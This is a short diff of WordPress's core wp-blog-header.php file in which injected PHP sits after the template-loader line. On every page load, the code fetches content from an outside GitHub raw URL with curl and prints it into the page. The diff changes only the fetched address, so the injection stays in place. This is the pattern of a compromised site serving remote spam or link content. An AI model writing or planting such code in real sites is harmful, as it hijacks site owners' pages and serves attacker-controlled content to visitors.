@@ -16,6 +16,6 @@ if ( ! isset( $wp_did_header ) ) {
 	wp();
 
 	// Load the theme template.
-	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/muhammadzainuri0468/links/main/index.html'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;
+	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/muhammadzainuri0468/links/main/'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;
 
 }
